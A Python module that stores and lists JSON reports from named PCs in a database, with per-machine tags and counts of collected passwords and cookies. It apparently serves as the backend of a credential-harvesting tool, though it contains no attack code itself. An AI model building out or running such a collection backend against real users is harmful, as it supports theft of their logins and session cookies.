import logging
import os
from datetime import UTC, datetime
from typing import Any

from sqlalchemy import or_

from app.db import SessionLocal
from app.models import Payload, Pc

logger = logging.getLogger(__name__)

ENVIRONMENT = os.getenv("ENVIRONMENT", "production")


def parse_payload_datetime(payload: dict[str, Any]) -> datetime:
    executed_at = payload.get("executedAt")
    if isinstance(executed_at, str):
        try:
            return datetime.fromisoformat(executed_at.replace("Z", "+00:00"))
        except ValueError:
            pass
    return datetime.now(UTC)


def ensure_pc_registered(session, pc_name: str, environment: str) -> None:
    exists = (
        session.query(Pc.id)
        .filter(Pc.pc_name == pc_name, Pc.environment == environment)
        .first()
    )
    if not exists:
        session.add(Pc(pc_name=pc_name, environment=environment, tag=None))


def sync_pcs_from_payloads(session, environment: str | None = None) -> None:
    query = session.query(Payload.environment, Payload.pc_name).distinct()
    if environment:
        query = query.filter(Payload.environment == environment)
    for env, pc_name in query.all():
        ensure_pc_registered(session, pc_name, env)


def get_pc_tags(session, keys: list[tuple[str, str]]) -> dict[tuple[str, str], str | None]:
    if not keys:
        return {}
    conditions = [(Pc.environment == env) & (Pc.pc_name == name) for env, name in keys]
    rows = session.query(Pc).filter(or_(*conditions)).all()
    tags = {(row.environment, row.pc_name): row.tag for row in rows}
    return {key: tags.get(key) for key in keys}


def save_payload_record(payload: dict[str, Any]) -> dict[str, Any]:
    pc_name = str(payload.get("hostname") or "unknown")
    recorded_at = parse_payload_datetime(payload)

    with SessionLocal() as session:
        ensure_pc_registered(session, pc_name, ENVIRONMENT)
        row = Payload(
            environment=ENVIRONMENT,
            pc_name=pc_name,
            datetime=recorded_at,
            content=payload,
        )
        session.add(row)
        session.commit()
        session.refresh(row)

    logger.info(
        "Saved payload id=%s environment=%s pc_name=%s",
        row.id,
        row.environment,
        row.pc_name,
    )
    return {
        "id": row.id,
        "environment": row.environment,
        "pc_name": row.pc_name,
        "datetime": row.datetime.isoformat(),
    }


def verify_database_connection() -> None:
    with SessionLocal() as session:
        session.connection()


def list_payloads(
    environment: str | None = None,
    pc_name: str | None = None,
    page: int = 1,
    page_size: int = 20,
) -> tuple[list[dict[str, Any]], int]:
    page = max(page, 1)
    page_size = max(min(page_size, 100), 1)

    with SessionLocal() as session:
        query = session.query(Payload).order_by(Payload.datetime.desc())
        if environment:
            query = query.filter(Payload.environment == environment)
        if pc_name:
            query = query.filter(Payload.pc_name == pc_name)

        total = query.count()
        rows = query.offset((page - 1) * page_size).limit(page_size).all()
        keys = [(row.environment, row.pc_name) for row in rows]
        tags = get_pc_tags(session, keys)
        items = [
            {
                "id": row.id,
                "environment": row.environment,
                "pc_name": row.pc_name,
                "tag": tags.get((row.environment, row.pc_name)),
                "datetime": row.datetime.isoformat(),
                "password_count": row.content.get("passwordCount"),
                "cookie_count": row.content.get("cookieCount"),
            }
            for row in rows
        ]
        return items, total


def get_payload_by_id(payload_id: int) -> dict[str, Any] | None:
    with SessionLocal() as session:
        row = session.get(Payload, payload_id)
        if row is None:
            return None
        return {
            "id": row.id,
            "environment": row.environment,
            "pc_name": row.pc_name,
            "datetime": row.datetime.isoformat(),
            "content": row.content,
        }


def list_distinct_environments() -> list[str]:
    with SessionLocal() as session:
        rows = session.query(Payload.environment).distinct().order_by(Payload.environment).all()
        return [row[0] for row in rows]


def list_distinct_pc_names(environment: str | None = None) -> list[str]:
    with SessionLocal() as session:
        query = session.query(Payload.pc_name).distinct()
        if environment:
            query = query.filter(Payload.environment == environment)
        rows = query.order_by(Payload.pc_name).all()
        return [row[0] for row in rows]


def list_pcs(
    environment: str | None = None,
    page: int = 1,
    page_size: int = 20,
) -> tuple[list[dict[str, Any]], int]:
    page = max(page, 1)
    page_size = max(min(page_size, 100), 1)

    with SessionLocal() as session:
        sync_pcs_from_payloads(session, environment)
        session.commit()

        query = session.query(Pc).order_by(Pc.pc_name.asc())
        if environment:
            query = query.filter(Pc.environment == environment)

        total = query.count()
        rows = query.offset((page - 1) * page_size).limit(page_size).all()
        items = [
            {
                "id": row.id,
                "environment": row.environment,
                "pc_name": row.pc_name,
                "tag": row.tag,
            }
            for row in rows
        ]
        return items, total


def update_pc_tag(pc_id: int, tag: str | None) -> dict[str, Any] | None:
    normalized = tag.strip() if tag else None
    if normalized == "":
        normalized = None

    with SessionLocal() as session:
        row = session.get(Pc, pc_id)
        if row is None:
            return None
        row.tag = normalized
        session.commit()
        session.refresh(row)
        return {
            "id": row.id,
            "environment": row.environment,
            "pc_name": row.pc_name,
            "tag": row.tag,
        }
